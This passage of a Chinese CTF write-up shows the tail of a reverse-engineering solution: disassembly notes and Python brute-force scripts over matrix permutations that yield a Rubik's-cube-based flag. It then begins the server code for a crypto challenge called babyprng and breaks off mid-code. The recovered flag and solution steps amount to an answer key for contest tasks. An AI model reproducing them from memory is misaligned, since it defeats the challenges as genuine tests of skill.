class="number">0x1AEF5581</span>, <span class="number">0x0B9CC1351</span>, <span class="number">0x9A3B536D</span>, <span class="number">0x0BD7FAF0F</span>, <span class="number">0x0F49AD883</span>, <span class="number">0x2C55324</span>, <span class="number">0x83BC3205</span>, <span class="number">0x43846281</span>, <span class="number">0x19382448</span>, <span class="number">0x0FADB2B18</span>, <span class="number">0x9335D185</span>, <span class="number">0x94C6BF5A</span>, <span class="number">0x591685AE</span>]</span><br><span class="line">m = combinations(a,<span class="number">5</span>)</span><br><span class="line">res = [[<span class="number">0x0D481DD44</span>, <span class="number">0x0E66CF0E0</span>], [<span class="number">0x6C86565D</span>, <span class="number">0x0EF6C2A6D</span>], [<span class="number">0x0D170230A</span>, <span class="number">0x9159B169</span>], [<span class="number">0x3DCF0D3F</span>, <span class="number">0x0D9331E76</span>], [<span class="number">0x64691AF0</span>, <span class="number">0x0DBF384CF</span>], [<span class="number">0x69E3E3A</span>, <span class="number">0x7122DE4D</span>]]</span><br><span class="line"><span class="comment"># get part of result</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    summ = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        summ+=mat[j]</span><br><span class="line">    summ&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(len(res)):</span><br><span class="line">        <span class="keyword">if</span> summ == res[k][<span class="number">0</span>]:</span><br><span class="line">            print(k,<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                print(hex(mat[j]))</span><br><span class="line">            print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> summ == res[k][<span class="number">1</span>]:</span><br><span class="line">            print(k,<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                print(hex(mat[j]))</span><br><span class="line">            print(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># then combine these output in Notepad++, get the a</span></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>
<p>把输出稍微整理一下，选出同一行有相同元素的（matrix[4]），把相同元素提取出来，得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">(0, 0)			(0, 1)</span><br><span class="line">0xfdfe0ba1L     0x51329f58</span><br><span class="line">0x7b33a8bb      0x6f7b9915</span><br><span class="line">0x3dc4ee74      0x2c55324</span><br><span class="line">0x3e1637a6      0x43846281</span><br><span class="line"></span><br><span class="line">0xdf7502ce</span><br><span class="line"></span><br><span class="line">(1, 0)			(1, 1)</span><br><span class="line">0xc96f3527L     0xf5201fcdL</span><br><span class="line">0x51ef954       0xdb8e3ef9L</span><br><span class="line">0x715a634c      0xeb1a8529L</span><br><span class="line">0x9335d185L     0x9a3b536dL</span><br><span class="line"></span><br><span class="line">0x9967f311L,</span><br><span class="line"></span><br><span class="line">(2, 0)			(2, 1)</span><br><span class="line">0x9b009084L     0xc381e2cdL</span><br><span class="line">0x18952236      0x98936ff0L</span><br><span class="line">0xbd7faf0fL     0xc3df1016L</span><br><span class="line">0x83bc3205L     0x94c6bf5aL</span><br><span class="line"></span><br><span class="line">0xdc9e8f3cL,</span><br><span class="line"></span><br><span class="line">(3, 0)			(3, 1)</span><br><span class="line">0x22b35be4      0x91fb13abL</span><br><span class="line">0x3372486a      0x80f07b8dL</span><br><span class="line">0xedd9d6d1L     0xad254c2eL</span><br><span class="line">0xfb9ca491L     0x1aef5581</span><br><span class="line"></span><br><span class="line">0xfe32ed8fL,</span><br><span class="line"></span><br><span class="line">(4, 0)			(4, 1)</span><br><span class="line">0x9cf903a1L     0xfe217f1cL</span><br><span class="line">0x9b555a08L     0xa9b44eafL</span><br><span class="line">0xb9cc1351L     0x259911b0</span><br><span class="line">0x591685ae      0xf54c810cL</span><br><span class="line"></span><br><span class="line">0x19382448,</span><br><span class="line"></span><br><span class="line">(5, 0)			(5, 1)</span><br><span class="line">0x5f2f456e      0x9a915052L</span><br><span class="line">0xfb67fe21L     0x4550e6ae</span><br><span class="line">0xbc1220f9L     0x9b0b7b06L</span><br><span class="line">0xf49ad883L     0xfadb2b18L</span><br><span class="line"></span><br><span class="line">0xfb5a012fL,</span><br></pre></td></tr></table></figure>
<p>那么现在问题在于，我们只是得到每一行有哪些元素，并不知道它们是如何排列的，毕竟加法满足交换律。</p>
<p>一行可能的结果数：4! * 4!  =  576</p>
<p>由于每一行互相是互不影响的，所以我们只需要穷举576*6种结果，找出其中经过计算得到flag后，有可见字符的结果拼接即可。</p>
<p>一开始我的解决方案是想办法patch程序中的内存，然而找不到好的方法写脚本，所以还得分析计算flag的方法</p>
<p>继续调试，check函数之后就是计算flag了，首先是长度为6的循环，八成是对应矩阵的每一行了</p>
<p>还是根据之前调试的方法，不难发现，先将matrix和constant的行数的指针放到[ebp-184h]和[ebp-188h]</p>
<p>之后进入了一个长度为9的循环，先猜测对应行中的每一个元素</p>
<p>有了先前分析的经验，现在在分析就上手一些了，最终有用的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:5655A8AC mov     eax, [ebp-8]           ; j</span><br><span class="line">.text:5655A8AF shl     eax, 2</span><br><span class="line">;...</span><br><span class="line">.text:5655A8F2 mov     ecx, [ebp-184h]</span><br><span class="line">.text:5655A8F8 add     ecx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655A9B6 mov     eax, [ebp-8]</span><br><span class="line">.text:5655A9B9 shl     eax, 2</span><br><span class="line">;...</span><br><span class="line">.text:5655AA01 mov     edx, [ebp-188h]</span><br><span class="line">.text:5655AA07 add     edx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655AA19 mov     eax, [ecx]</span><br><span class="line">.text:5655AA1B mov     ecx, [edx]</span><br><span class="line">.text:5655AA1D imul    eax, ecx</span><br><span class="line">;...</span><br><span class="line">.text:5655AA95 mov     ecx, [ebp-18Ch]</span><br><span class="line">.text:5655AA9B add     ecx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655AAC7 mov     [ebp-18Ch], ecx        ; m[i][j]*c[i][j]</span><br><span class="line">.text:5655AACD jmp     loc_5655A818           ; j++</span><br></pre></td></tr></table></figure>
<p>其实就是两个矩阵对应元素相乘，同一行再相加</p>
<p>外循环干的事：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:5655AB0A mov     eax, [ebp-4]           ; i</span><br><span class="line">.text:5655AB0D shl     eax, 2</span><br><span class="line">;...</span><br><span class="line">.text:5655AB4C lea     ecx, [ebp-180h]        ; flag</span><br><span class="line">.text:5655AB52 add     ecx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655AB83 mov     eax, [ebp-18Ch]        ; the result of every row</span><br><span class="line">.text:5655AB89 mov     [ecx], eax</span><br><span class="line">.text:5655AB8B jmp     loc_5655A565           ; i++</span><br></pre></td></tr></table></figure>
<p>那么加完的内容就是最后要输出的东西了，开始穷举：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line">res = [[<span class="number">0x0D481DD44</span>, <span class="number">0x0E66CF0E0</span>], [<span class="number">0x6C86565D</span>, <span class="number">0x0EF6C2A6D</span>], [<span class="number">0x0D170230A</span>, <span class="number">0x9159B169</span>], [<span class="number">0x3DCF0D3F</span>, <span class="number">0x0D9331E76</span>], [<span class="number">0x64691AF0</span>, <span class="number">0x0DBF384CF</span>], [<span class="number">0x69E3E3A</span>, <span class="number">0x7122DE4D</span>]]</span><br><span class="line">constmat = [<span class="number">0x0B849CD19</span>, <span class="number">0x55E00017</span>, <span class="number">0x844966B</span>, <span class="number">0x80C181EC</span>, <span class="number">0x686C0B3C</span>, <span class="number">0x55400592</span>, <span class="number">0x0CD42168A</span>, <span class="number">0x4039E81</span>, <span class="number">0x0D9DE549F</span>, <span class="number">0x2034677D</span>, <span class="number">0x144ABD</span>, <span class="number">0x49100D00</span>, <span class="number">0x0E003A0E0</span>, <span class="number">0x80F0006D</span>, <span class="number">0x8307ADD6</span>, <span class="number">0x4CF60781</span>, <span class="number">0x0A0352643</span>, <span class="number">0x0C580C3DE</span>, <span class="number">0x0EA8C4E24</span>, <span class="number">0x68603008</span>, <span class="number">0x687FBFFF</span>, <span class="number">0x19DE4BF9</span>, <span class="number">0x271A1179</span>, <span class="number">0x99791C4D</span>, <span class="number">0x29CBFFC</span>, <span class="number">0x2B82801E</span>, <span class="number">0x3C0307FB</span>, <span class="number">0x0DAE61CD6</span>, <span class="number">0x8F7B1BF0</span>, <span class="number">0x0C56CEF1D</span>, <span class="number">0x0D6493A96</span>, <span class="number">0x1808018</span>, <span class="number">0x0F48001B9</span>, <span class="number">0x3712519</span>, <span class="number">0x9294F318</span>, <span class="number">0x6DE20384</span>, <span class="number">0x0F3750B04</span>, <span class="number">0x256A122A</span>, <span class="number">0x257290B</span>, <span class="number">0x0C4582056</span>, <span class="number">0x204E8BC0</span>, <span class="number">0x79C7ADE7</span>, <span class="number">0x0C4C20203</span>, <span class="number">0x5B961570</span>, <span class="number">0x66034856</span>, <span class="number">0x78329E3A</span>, <span class="number">0x1D07C00</span>, <span class="number">0x4AC240E6</span>, <span class="number">0x854CFBBE</span>, <span class="number">0x0ABFEC404</span>, <span class="number">0x5BD80037</span>, <span class="number">0x0E94CBCD8</span>, <span class="number">0x1</span>, <span class="number">0x0C4CA280D</span>]</span><br><span class="line">a= [[[<span class="number">0xfdfe0ba1</span>, <span class="number">0x7b33a8bb</span>, <span class="number">0x3dc4ee74</span>, <span class="number">0x3e1637a6</span>],[<span class="number">0x51329f58</span>, <span class="number">0x6f7b9915</span>, <span class="number">0x2c55324</span>, <span class="number">0x43846281</span>],<span class="number">0xdf7502ce</span>],[[<span class="number">0xc96f3527</span>, <span class="number">0x51ef954</span>, <span class="number">0x715a634c</span>, <span class="number">0x9335d185</span>], [<span class="number">0xf5201fcd</span>, <span class="number">0xdb8e3ef9</span>, <span class="number">0xeb1a8529</span>, <span class="number">0x9a3b536d</span>],<span class="number">0x9967f311</span>],[[<span class="number">0x9b009084</span>, <span class="number">0x18952236</span>, <span class="number">0xbd7faf0f</span>, <span class="number">0x83bc3205</span>], [<span class="number">0xc381e2cd</span>, <span class="number">0x98936ff0</span>, <span class="number">0xc3df1016</span>, <span class="number">0x94c6bf5a</span>], <span class="number">0xdc9e8f3c</span>],[[<span class="number">0x22b35be4</span>, <span class="number">0x3372486a</span>, <span class="number">0xedd9d6d1</span>, <span class="number">0xfb9ca491</span>], [<span class="number">0x91fb13ab</span>, <span class="number">0x80f07b8d</span>, <span class="number">0xad254c2e</span>, <span class="number">0x1aef5581</span>], <span class="number">0xfe32ed8f</span>],[[<span class="number">0x9cf903a1</span>, <span class="number">0x9b555a08</span>, <span class="number">0xb9cc1351</span>, <span class="number">0x591685ae</span>], [<span class="number">0xfe217f1c</span>, <span class="number">0xa9b44eaf</span>, <span class="number">0x259911b0</span>, <span class="number">0xf54c810c</span>], <span class="number">0x19382448</span>],[[<span class="number">0x5f2f456e</span>, <span class="number">0xfb67fe21</span>, <span class="number">0xbc1220f9</span>, <span class="number">0xf49ad883</span>], [<span class="number">0x9a915052</span>, <span class="number">0x4550e6ae</span>, <span class="number">0x9b0b7b06</span>, <span class="number">0xfadb2b18</span>], <span class="number">0xfb5a012f</span>]]</span><br><span class="line">m = permutations([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],<span class="number">4</span>)</span><br><span class="line">n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    n.append(i)</span><br><span class="line">cont = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">'#########part %d#########'</span>%i)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> n:</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> n:</span><br><span class="line">            cont+=<span class="number">1</span></span><br><span class="line">            ress = <span class="string">''</span></span><br><span class="line">            resr = []</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">0</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">0</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">1</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">1</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">2</span>])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">2</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">2</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">1</span>][q[<span class="number">3</span>]])</span><br><span class="line">            resr.append(a[i][<span class="number">0</span>][p[<span class="number">3</span>]])</span><br><span class="line">            sumr = <span class="number">0</span></span><br><span class="line">            check0 = resr[<span class="number">0</span>]+resr[<span class="number">2</span>]+resr[<span class="number">4</span>]+resr[<span class="number">6</span>]+resr[<span class="number">8</span>]</span><br><span class="line">            check0&amp;=<span class="number">0xffffffff</span></span><br><span class="line">            check1 = resr[<span class="number">1</span>]+resr[<span class="number">3</span>]+resr[<span class="number">4</span>]+resr[<span class="number">5</span>]+resr[<span class="number">7</span>]</span><br><span class="line">            check1&amp;=<span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">if</span>  check0 != res[i][<span class="number">0</span>]:</span><br><span class="line">                print(i)</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> resr:</span><br><span class="line">                    print(hex(k))</span><br><span class="line">                print(<span class="string">''</span>)</span><br><span class="line">                print(hex(check0))</span><br><span class="line">                print(hex(res[i][<span class="number">0</span>]))</span><br><span class="line">                print(p)</span><br><span class="line">                print(q)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">assert</span> check0 == res[i][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> check1 == res[i][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(len(resr)):</span><br><span class="line">                sumr+=resr[k]*constmat[i*<span class="number">9</span>+k]</span><br><span class="line">                sumr&amp;=<span class="number">0xFFFFFFFF</span></span><br><span class="line">            ff = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                temp = sumr&amp;<span class="number">0xFF</span></span><br><span class="line">                <span class="keyword">if</span> temp &lt; <span class="number">0x20</span> <span class="keyword">or</span> temp &gt;= <span class="number">0x7f</span>:</span><br><span class="line">                    ff = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                ress+=chr(temp)</span><br><span class="line">                sumr&gt;&gt;=<span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> ff == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            print(ress)</span><br></pre></td></tr></table></figure>
<p>把输出按语义拼接一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;uG8   \w8]   J|@&gt;   Oh)!   ye$B   ukxG</span><br><span class="line">xU&quot;a   Gj3o   S_Cu   &#125;]nU   h`1)   uHnr</span><br><span class="line">W8F?   &#123;7h1   X4G\   63_i   *[T3   ;73-</span><br><span class="line">P[jk   KP6o   Xp,T   -gF:   s_m4   a/_j</span><br><span class="line">|/Zj   v9E[   oeps   -S96   \Q&#125;]   g1c&#125;</span><br><span class="line">:!);   B::(   &apos;-SR   ERNJ   gJO(   AR&amp;|</span><br><span class="line">*CTF   a&apos;/0   SA;V   nL?K   SZL    4nEE</span><br><span class="line">uP@J   uk6W   @GhI   RV&amp;b   &quot;-R!   YOcm</span><br><span class="line">erkU   XP#3          2\t$   5zB(   AkT6</span><br><span class="line">Mc=F   hx-A          Q7^&lt;          -l/l</span><br><span class="line">;|.b   X .;          &lt;1I7          YctL</span><br><span class="line">=!M3   4gjL          1I@B          VRae</span><br><span class="line">A6V\   /_&quot;u          jke&amp;</span><br><span class="line">k?!R   ^I;-</span><br><span class="line">       :q(V</span><br><span class="line"></span><br><span class="line">*CTF&#123;7h1S_Cu63_is_m4g1c&#125;</span><br></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>因为刚开始学花指令，没找去除冗余代码的方法，脚本写不出来，所以干脆就纯看汇编做的，感觉方法比较蠢，需要胆大心细，但是做的过程中也多多少少对这种混淆的方法有了一定的了解，有空的话深究一下高级一点去花方法。</p>
<p>此外，比赛时并没有发现这道题的算法是什么，赛后跟大牛交流了一下其实这是一个魔方，6*9个元素对应6个面每个面9个块，18种输入对应18种标准魔方的操作，每个面顺时针逆时针旋转90度加3个中间块的两个方向旋转90度。不过知道是魔方之后也想不到有什么很好的解决方法。颜色不知道，最终还原的魔方的状态也不知道，只知道还原的魔方能过check。<br>还有一点，由于魔方边块和角块必须是挨着的，在矩阵上就能满足某种特定的规则，这样在我之前的穷举时就能去除那些不紧挨的情况了，可能最终的输出会被缩小很多，如果遇到flag没有语义的情况会有优势。</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="babyprng"><a href="#babyprng" class="headerlink" title="babyprng"></a>babyprng</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,random,sys,string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    TH = <span class="number">0.9</span> <span class="comment"># overwritten!!</span></span><br><span class="line">    DELTA = <span class="number">0.005</span></span><br><span class="line">    SIZE = <span class="number">100000</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(self)</span>:</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">''</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof).hexdigest()</span><br><span class="line">        self.request.send(<span class="string">"sha256(XXXX+%s) == %s\n"</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">        self.request.send(<span class="string">'Give me XXXX:'</span>)</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>)</span><br><span class="line">        x = x.strip()</span><br><span class="line">        <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvhex</span><span class="params">(self, sz)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = sz</span><br><span class="line">            res = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> r&gt;<span class="number">0</span>:</span><br><span class="line">                res += self.request.recv(r)</span><br><span class="line">                <span class="keyword">if</span> res.endswith(<span class="string">'\n'</span>):</span><br><span class="line">                    r = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = sz - len(res)</span><br><span class="line">            res = res.strip()</span><br><span class="line">            res = res.decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dosend</span><span class="params">(self, msg)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randbit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> random.random()&gt;self.TH:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, code)</span>:</span></span><br><span class="line">        stack = []</span><br><span class="line">        out = []</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        self.TH = <span class="number">0.7</span> + random.random()*<span class="number">0.25</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(self.SIZE):</span><br><span class="line">            stack.append(self.randbit())</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pos = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(self.SIZE*<span class="number">10</span>):</span><br><span class="line">                c = code[pos]</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> c==<span class="string">'\x00'</span>:</span><br><span class="line">                    out.append(stack[<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x01'</span>:</span><br><span class="line">                    <span class="keyword">if</span> stack[<span class="number">-1</span>]==<span class="number">1</span>:</span><br><span class="line">                        pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x02'</span>:</span><br><span class="line">                    <span class="keyword">del</span> stack[<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x03'</span>:</span><br><span class="line">                    stack[<span class="number">-1</span>] = stack[<span class="number">-1</span>]&amp;stack[<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x04'</span>:</span><br><span class="line">                    stack[<span class="number">-1</span>] = stack[<span class="number">-1</span>]|stack[<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">elif</span> c==<span class="string">'\x05'</span>:</span><br><span class="line">                    stack[<span class="number">-1</span>] = stack[<span class="number">-1</span>]^stack[<span class="number">-2</span>]</span><br><span class="line">                <span class="comment">#elif c=='\x06':</span></span><br><span class="line">                <span class="comment">#    stack[-1] = 1-stack[-1]</span></span><br><span class="line">                <span class="comment">#elif c=='\x06':</span></span><br><span class="line">                <span class="comment">#    stack.append(stack[-1])</span></span><br><span class="line">                <span class="keyword">elif</span> ord(c)&gt;=<span class="number">0x10</span> <span class="keyword">and</span> ord(c)&lt;=<span class="number">0x30</span>:</span><br><span class="line">                    pos += ord(c)<span class="number">-0x10</span></span><br><span class="line">                <span class="keyword">elif</span> ord(c)&gt;=<span class="number">0x30</span> <span class="keyword">and</span> ord(c)&lt;=<span class="number">0x50</span>:</span><br><span class="line">                    pos -= ord(c)<span class="number">-0x30</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> out</span><br><span 